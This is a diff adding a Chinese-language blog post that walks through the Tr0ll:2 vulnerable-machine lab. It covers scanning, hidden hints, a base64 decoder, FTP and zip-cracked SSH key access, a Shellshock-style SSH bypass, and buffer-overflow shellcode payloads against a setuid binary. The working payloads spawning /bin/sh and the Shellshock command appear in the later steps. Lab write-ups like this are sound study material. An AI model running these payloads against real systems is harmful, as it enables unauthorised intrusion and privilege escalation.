@@ -14922,6 +14922,217 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Tr0ll:2</title>
+    <url>/2020/08/03/vnkg3q/</url>
+    <content><![CDATA[<p>首先扫描端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596509472379-dd9bf517-be28-4add-bc9e-9083252aaaf0.png#align=left&display=inline&height=157&margin=%5Bobject%20Object%5D&name=image.png&originHeight=270&originWidth=1033&size=83749&status=done&style=stroke&width=599" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>扫目录，发现了这些东西，去访问一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596510787515-8455db20-3c63-4720-99d7-92ecb645da8d.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&name=image.png&originHeight=230&originWidth=597&size=47801&status=done&style=stroke&width=520" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>robots.txt 中有很多目录</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596510655541-e0433843-406d-4a36-b10c-2487f754f17e.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=537&originWidth=521&size=28616&status=done&style=stroke&width=422" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>去访问了一下，在<br>dont_bother<br>keep_trying<br>noob<br>ok_this_is_it<br>这四个目录下有图片，下载下来，发现 dont_bother 跟其他图片的 md5 不一样</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596542592567-97895a68-748b-494e-a679-a24f12ff2ea4.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=217&originWidth=835&size=177154&status=done&style=none&width=635" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>用 winhex 看，最后有一行 Look Deep within y0ur_self for the answer<br>去访问一下，得到一个文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596544121756-840c870a-6e98-400a-95be-d19c27a4a14d.png#align=left&display=inline&height=251&margin=%5Bobject%20Object%5D&name=image.png&originHeight=370&originWidth=603&size=36676&status=done&style=stroke&width=409" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>文件中是一些 base64 编码后的东西</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596544255986-28b1bb33-7dda-4c19-b241-35cd5d0e4007.png#align=left&display=inline&height=433&margin=%5Bobject%20Object%5D&name=image.png&originHeight=667&originWidth=599&size=31127&status=done&style=stroke&width=389" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>写个小脚本转一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = open(<span class="string">'./flag.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">lines = file.readlines()</span><br><span class="line">new=[]</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">	line=base64.b64decode(line)</span><br><span class="line">	new.append(line)</span><br><span class="line">file_out=open(<span class="string">'./flag_out.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> line1 <span class="keyword">in</span> new:</span><br><span class="line">	file_out.writelines(line1)</span><br><span class="line">file_out.close()</span><br></pre></td></tr></table></figure>
+
+<p>用 ftp 协议去访问一下，使用 Tr0ll：Tr0ll 登录成功</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596544698902-a22ee3db-19f7-4cd4-8907-76dab7a02888.png#align=left&display=inline&height=205&margin=%5Bobject%20Object%5D&name=image.png&originHeight=265&originWidth=521&size=24220&status=done&style=stroke&width=403" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>下载下来，用刚才拿到的字典跑一下，瞬间出结果：ItCantReallyBeThisEasyRightLOL</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596544813966-2cbc4790-c565-4cf0-b29a-f6124548b067.png#align=left&display=inline&height=311&margin=%5Bobject%20Object%5D&name=image.png&originHeight=524&originWidth=1033&size=161068&status=done&style=stroke&width=613" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>用 winhex 打开压缩包里的文件，看上去是私钥</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596544904169-11d4cf03-e6b7-43d4-b068-a3b2934562bb.png#align=left&display=inline&height=667&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1075&originWidth=1095&size=191094&status=done&style=stroke&width=679" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>尝试去登陆 ssh -i noob <a href="mailto:noob@192.168.149.192">noob@192.168.149.192</a><br>-i 是指定密钥的，我猜用户名就是 noob</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596545650814-7700b12c-a751-420d-a7f9-214ceaaaf6fb.png#align=left&display=inline&height=246&margin=%5Bobject%20Object%5D&name=image.png&originHeight=372&originWidth=1005&size=411019&status=done&style=none&width=665" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>但是提示说没有权限？</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596545755248-a61550f6-b74d-48dd-8c18-bf0757f5dfc6.png#align=left&display=inline&height=241&margin=%5Bobject%20Object%5D&name=image.png&originHeight=481&originWidth=1584&size=131238&status=done&style=stroke&width=792" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>说是我这个密钥权限太高了，那就改的小一点，wsl 改不了 windows 正常目录下的文件权限，拷到 wsl 自己的目录下改权限再试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596546182730-e954425a-304b-4a40-a7bb-dd339a197d0e.png#align=left&display=inline&height=244&margin=%5Bobject%20Object%5D&name=image.png&originHeight=352&originWidth=735&size=257376&status=done&style=none&width=510" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>用这种方式绕过：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -i noob noob@192.168.149.192 '() &#123; :;&#125;; /bin/bash'</span><br></pre></td></tr></table></figure>
+
+<p>还是用 python 弄个交互的：python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>嗷，涨知识了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596546517965-b5d39eb1-a48b-4df9-9615-f7f36ac2db52.png#align=left&display=inline&height=107&margin=%5Bobject%20Object%5D&name=image.png&originHeight=215&originWidth=1453&size=413994&status=done&style=none&width=726.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在 /nothing_to_see_here/choose_wisely 中每个文件夹有二进制文件，都有 s 的权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596547047836-f487cfce-e428-4bda-851b-ec4c6a3a78c2.png#align=left&display=inline&height=292&margin=%5Bobject%20Object%5D&name=image.png&originHeight=467&originWidth=674&size=405470&status=done&style=stroke&width=421" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>啊我吐了，nc 也不能用，git 也没有</p>
+<p>执行第一个给我退出来了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596548390849-78a70f2b-aad8-4d37-84bc-2031e27bd0bc.png#align=left&display=inline&height=145&margin=%5Bobject%20Object%5D&name=image.png&originHeight=198&originWidth=735&size=190113&status=done&style=none&width=537" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>试了一下第二个进入了困难模式？？</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596548284015-873bf8bf-14d6-4d7f-9771-432ab777dbb7.png#align=left&display=inline&height=121&margin=%5Bobject%20Object%5D&name=image.png&originHeight=170&originWidth=734&size=164752&status=done&style=none&width=524" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>第三个貌似是栈溢出</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596548557906-cb63f534-561c-415c-9af2-ebb5713686f8.png#align=left&display=inline&height=97&margin=%5Bobject%20Object%5D&name=image.png&originHeight=152&originWidth=821&size=169171&status=done&style=none&width=523" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>cyclic 算出偏移</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596548676302-fa685c99-1b94-48e5-998c-3da1bab45418.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1483&size=1355543&status=done&style=none&width=741.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>过了一会文件又没了去了 door2… 被作者玩弄于股掌之间</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596548865627-74002ef4-ce3f-4547-b5a4-ee3821ca71ab.png#align=left&display=inline&height=384&margin=%5Bobject%20Object%5D&name=image.png&originHeight=567&originWidth=743&size=458687&status=done&style=none&width=503" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./r00t $(python -c "print 'A' * 268 + '\x80\xfb\xff\xbf' + 'a' * 16  + '\xba\xa0\x7b\x18\x95\xdb\xcd\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0b\x31\x50\x15\x83\xe8\xfc\x03\x50\x11\xe2\x55\x11\x13\xcd\x0c\xb4\x45\x85\x03\x5a\x03\xb2\x33\xb3\x60\x55\xc3\xa3\xa9\xc7\xaa\x5d\x3f\xe4\x7e\x4a\x37\xeb\x7e\x8a\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93'")</span><br></pre></td></tr></table></figure>
+
+<p>我就先拿大佬们的 payload 来打了，突然发现在这种情况先我都不知道咋分析，不知所措</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596549152151-9477ee65-9c7f-402e-b2b5-3af4bb35ea4a.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&name=image.png&originHeight=415&originWidth=1457&size=752009&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>我想把这个靶机的内容给提出来，直接拷到 /var/www 目录下，浏览器访问下载下来</p>
+<p>查看 ubuntu 发行版本（在这里暂时记一下）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1596549604397-a4056180-5d0a-4253-b673-ac94ca16b343.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=image.png&originHeight=171&originWidth=422&size=92540&status=done&style=none&width=330" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>后来在本地做的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line">payload=shellcode+<span class="string">'a'</span>*(<span class="number">268</span>-len(shellcode))+<span class="string">'\xc0\xd3\xff\xff'</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./r00t $(python -c "print 'A' * 268 + '\x80\xfb\xff\xbf' + 'a' * 16  + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")</span><br></pre></td></tr></table></figure>
+
+<p>不是，为啥这样 👆 行，这样就 👇 不行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./r00t $(python -c "print 'A' * 268 + '\x70\xfb\xff\xbf'  + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
     <title>PWN题练一下</title>
     <url>/2019/11/10/vpgk9n/</url>
     <content><![CDATA[<h1 id="LEVEL3"><a href="#LEVEL3" class="headerlink" title="LEVEL3"></a>LEVEL3</h1><p>首先检查一下保护</p>
